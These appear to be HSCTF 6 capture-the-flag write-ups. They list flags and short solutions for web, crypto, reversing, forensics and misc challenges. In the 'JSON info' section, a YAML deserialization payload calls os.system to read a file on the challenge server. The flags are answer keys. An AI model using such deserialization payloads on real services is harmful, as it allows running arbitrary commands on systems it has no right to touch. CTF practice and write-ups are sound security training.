
<h1> Web </h1>

Flag is: hsctf{that_was_pretty_easy_right}
<br> View source code with Ctrl + U then you got the first part: 
<pre> The first part of the flag is: hsctf{that_was_ </pre>
Open <code>script.js view-source:https://inspect-me.web.chal.hsctf.com/style.css </code> you got second part
  <pre><code>/* The second part of the flag is: pretty_easy_ */</pre></code>
  Open <i><link rel="stylesheet" href="style.css"></i> you got last part
  <pre><code>
// The last part of the flag is: right}</pre></code>

<h2> JSON info </h2>
<b>>socat - tcp:misc.hsctf.com:9999</b>
<pre>Welcome to JSON info!
Please enter your JSON:</pre>
<b>!!python/object/apply:os.system ["cat flag.txt"]</b>
</pre>hsctf{JS0N_or_Y4ML}
</pre>

<h2> keith Bot </h2>




<h1> Binary Exploitation </h1>
<h2> Intro to netcat </h2>
open terminal and type: nc misc.hsctf.com 1111
flag:

<h2> Forget your password </h2>
<b> from <a href="https://github.com/kuruwa2/ctf-writeups/blob/master/HSCTF%206/Forgot%20Your%20Password/generator.py">kuruwa2</a></b>
<pre><code>
#!/usr/bin/env python2

ch = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ '
s = [1975711866010926419, 15319349121703965325]
# TOP SECRET: DO NOT LEAK
def o(x,k):
	return x<<k
def m(a):
	return a&0xffffffffffffffff
def next():
	b = m(s[0]+s[1])
	h()
	return m(b)
def p(k, x):
	return x>>(64-k)
def x(b, a):
	return a^b
def oro(a, b):
	return a|b
def h():
	s1 = m(x(s[0],s[1]))
	s[0] = m(x(oro(o(s[0],55),p(55,s[0])),x(s1,(o(s1,14)))))
	s[1] = m(oro(o(s1,36),p(36,s1)))

# Helper methods
def bin2chr(data):
    result = ''
    while data:
        char = data & 0xff
        result += chr(char)
        data >>= 8
    return result

def isp(d):
	if all(c in ch for c in d):
		return d
	else:
		return d.encode('hex')

# throw away first value for additional randomness
# next()
# next()

COMBO_NUM_1 = isp(bin2chr(next())) + isp(bin2chr(next()))
COMBO_NUM_2 = isp(bin2chr(next())) + isp(bin2chr(next()))
COMBO_NUM_3 = isp(bin2chr(next())) + isp(bin2chr(next()))

print "Thanks! Your numbers are: "
print COMBO_NUM_1
print COMBO_NUM_2
print COMBO_NUM_3
</pre></code>



<h2> Multiplication service </h2>
<pre> <code>p = 2^448 - 2^224 - 1
F=GF(p)
g=F(2)
# use that k * (0, 2) = (0, 2^k), define this to be h
h=F(260571191137716815341287411517193580203843541276741273922047807416174982227377817356425394246343714490986635819120516038840847423836513L)
G=[]
H=[]
X=[]
c=[]
N=[2, 641, 18287, 196687, 1466449, 2916841, 6700417, 1469495262398780123809, 167773885276849215533569, 596242599987116128415063, 37414057161322375957408148834323969]

for i in range(0,len(N)):
    G.append( g^((p-1)/N[i]) )
    H.append( h^((p-1)/N[i] ) )
    X.append(sage.groups.generic.bsgs( G[i] ,H[i],[0, 2**40] ))
    c.append( (X[i],N[i]) )

c.reverse()

for i in range(len(c)):
    if len(c) < 2:
        break
    t1=c.pop()
    t2=c.pop()
    r=crt(t1[0],t2[0],t1[1],t2[1])
    m=t1[1]*t2[1]
    c.append((r,m))

key = c[0][0]
assert(pow(2,key,p)==h)
</pre> </code>

<h2> I though Trig was really easy </h2>
<b>From <a href="https://github.com/kuruwa2/ctf-writeups/tree/master/HSCTF%206/I%20Thought%20Trig%20Was%20Really%20Easy">kuruwa2</a></b>
<pre><code>
import math

def nice_math(x, y):
    return round(x + y*math.cos(math.pi * x))

lots_of_nums = lambda n,a:(lambda r:[*r,n-sum(r)])(range(n//a-a//2,n//a+a//2+a%2))

def get_number(char):
    return ord(char) - 96

inp = input("Enter the text: ")

out = []
for i in range(0, len(inp)):
    for j in lots_of_nums(nice_math(get_number(inp[i]), len(inp) - i), i + 1):
        out.append(nice_math(j, i + 1))

ans = [-25, 1, 10, 7, 4, 7, 2, 9, 3, 8, 1, 10,
            3, -1, -8, 3, -6, 5, -4, 7, -5, 8, -3,
            10, -1, 12, 10, 7, -6, 9, -4, 11, -2,
            13, -2, -11, 6, -9, 8, -7, 10, -5, 12,
            1, -12, 7, -10, 9, -8, 11, -6, 13, -4,
            11, 6, -13, 8, -11, 10, -9, 12, -7, 14,
            -5, 22, -16, 7, -14, 9, -12, 11, -10, 13,
            -8, 15, -6, -2, 2, -21, 4, -19, 6, -17, 8,
            -15, 10, -13, 12, -11, 5]
if (out == ans):
    print("That is correct! Flag: hsctf{" + inp + "}")
else:
    print("Nope sorry, try again!")
</pre></code>


<h1> Forensics </h1>
<h2> Chicken Crossing </h2>
<b>root@kali:~/Downloads# strings hsctf-chicken_crossing.jpg | grep hsctf</b>
<pre>hsctf{2_get_2_the_other_side}</pre>
Flag is: hsctf{2_get_2_the_other_side}

<h2> Slap </h2>
<b>root@kali:~/Downloads# exiftool slap.jpg | grep hsctf</b>
<pre>Location Shown Country Name     : Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut la bore et dolore magna aliqua. Massa id neque aliquam vestibulum morbi blandit cursu hsctf{twoslapsnonetforce} s risus. Sed viverra ipsum nunc aliquet bibendum. Nisl purus in mollis nunc sed. Risus commodo viverra maecenas accumsan lacus vel facilisis volutpat. Magna eget est lorem ipsum dolor sit amet consectetur. Euismod in pellentesque massa placerat. Condimentum vitae sapien pellentesque habitant morbi. Cras sed felis eget velit aliquet sagittis id consectetur. Urna condimentum mattis pellentesque id nibh tortor. Odio aenean sed adipiscing diam donec adipiscing tristique risus nec. Faucibus nisl tincidunt eget nullam non nisi est sit amet. Enim nunc faucibus a pellentesque. Augue eget arcu dictum varius duis at consectetur. Morbi quis commodo odio aenean. Curabitur vitae nunc sed velit dignissim sodales ut. Id venenatis a condimentum vitae sapien pellentesque habitant. Erat nam at lectus urna duis.
Location Shown Sublocation      : Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Massa id neque aliquam vestibulum morbi blandit cursus risus. Sed viverra ipsum nunc aliquet bibendum. Nisl purus in mollis nunc sed. Risus commodo viverra maecenas accumsan lacus vel facilisis volutpat. Magna eget est lorem ipsum dolor sit amet consectetur. Euismod in pellentesque massa placerat. Condimentum <b>hsctf{twoslapsnonetforce}</b> vitae sapien pellentesque habitant morbi. Cras sed felis eget velit aliquet sagittis id consectetur. Urna condimentum mattis pellentesque id nibh tortor. Odio aenean sed adipiscing diam donec adipiscing tristique risus nec. Faucibus nisl tincidunt eget nullam non nisi est sit amet. Enim nunc faucibus a pellentesque. Augue eget arcu dictum varius duis at consectetur. Morbi quis commodo odio aenean. Curabitur vitae nunc sed velit dignissim sodales ut. Id venenatis a condimentum vitae sapien pellentesque habitant. Erat nam at lectus urna duis.</pre>
Flag is: hsctf{twoslapsnonetforce}

<h2> Cool Image </h2>
Flag is: hsctf{sorry_about_the_extra_bytes}
<br><b>root@kali:~/Downloads# file cool.pdf </b>
<pre>cool.pdf: PNG image data, 1326 x 89, 8-bit/color RGBA, non-interlaced</pre>
<b>root@kali:~/Downloads# cp cool.pdf coolpdf.png</b>
<br>open the image you can see the flag

<h2> </he>
use an <a href="https://stylesuxx.github.io/steganography/">online LSB steganography tool</a> to uncover the message
<pre><code>
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis non velit rutrum, porttitor est a, porttitor nisi. Aliquam placerat nibh ut diam faucibus, ut auctor felis sodales. Suspendisse egestas tempus libero, efficitur finibus orci congue sit amet. Sed accumsan mi sit amet porttitor pellentesque. Morbi et porta lacus. Nulla ligula justo, pulvinar imperdiet porta quis, accumsan et massa. In viverra varius eleifend. Ut congue feugiat leo a ultrices.

Ut risus ipsum, dictum id euismod nec, mattis eu dolor. In aliquam viverra congue. Mauris lacinia lectus quis erat porttitor, vitae iaculis mauris ultrices. Donec quis imperdiet mi, et fermentum purus. Mauris rhoncus sit amet ex quis gravida. In tempor, libero vel finibus tristique, velit est vestibulum est, non semper leo mauris vel enim. Nulla non orci pharetra, bibendum quam a, pharetra felis. Morbi tincidunt, mauris nec aliquam maximus, eros justo rutrum odio, in dapibus sem arcu blandit nunc. Mauris dapibus sem lorem, quis lacinia nunc consectetur pulvinar. Donec sapien erat, pulvinar non fermentum tempor, auctor pellentesque tortor.

Suspendisse id vehicula enim. Cras ut enim sollicitudin, aliquam mauris eget, vehicula arcu. Morbi convallis sed nulla et pellentesque. Cras risus justo, fermentum eget ex ac, dictum dignissim magna. Nullam nec velit vel nulla varius gravida. Aliquam ac lorem tempor, venenatis nibh sed, ultricies urna. In fringilla hendrerit purus, tristique aliquam ipsum molestie vitae. Sed efficitur auctor lacus ac luctus.

Donec id viverra augue. Vivamus nullhsctf{th4_l3est_s3gnific3nt_bbbbbbbbbbbbb}a neque, iaculis quis urna eget, gravida commodo quam. Vestibulum porttitor justo in suscipit rutrum. Sed id tristique ipsum. Nulla vel porta nisl. Quisque leo quam, placerat id neque eu, ullamcorper facilisis lacus. Maecenas magna eros, sollicitudin id est a, fermentum elementum leo. Vestibulum porttitor urna eget bibendum interdum. Mauris eget consequat est. Aenean hendrerit eleifend finibus. Sed eu luctus nulla, non tristique nunc. Cras aliquet vehicula tincidunt. Maecenas nec semper ipsum.

Proin pulvinar lacus id malesuada bibendum. Mauris ac sapien eros. Sed non neque id ante porta finibus eget eget enim. Pellentesque placerat, neque sit amet dictum eleifend, tortor dolor porttitor ex, in vestibulum lacus tortor id purus. Phasellus varius nulla sed magna finibus aliquet. Proin eros metus, sodales vel enim eu, imperdiet pulvinar erat. Nunc quis iaculis dui. In cursus a urna in dapibus. Sed eu elementum quam. Vivamus ornare convallis leo sed mollis. Aenean sit amet nulla vel leo cursus dictum ac nec sem. Morbi nec ultrices felis.
</pre></code>

<h2> Cool image 2</h2>
<b>$ foremost cool.png</b>
<br><b>$ eog output/png/*.png</b>



<h1> Miscellaneous </h1>
<h2> Admin Pass</h2>
Check git log and view the content of commit: <code>https://gitlab.com/WeastieWeastie/admin-password/commit/ced3b4c6774184cddaa641a6091210a6242c889e</code>
<br>Flag is: <hsctf{i_love_richard_stallman_hes_so_cute_8a65926fcdcdac0b}

<h2> Discord </h2>
access follow the link in goal: https://discord.gg/KRqsec6 with your acc details
croll on #announment the you can see the flag of this challenges
hsctf{hi_welcome_to_discord}




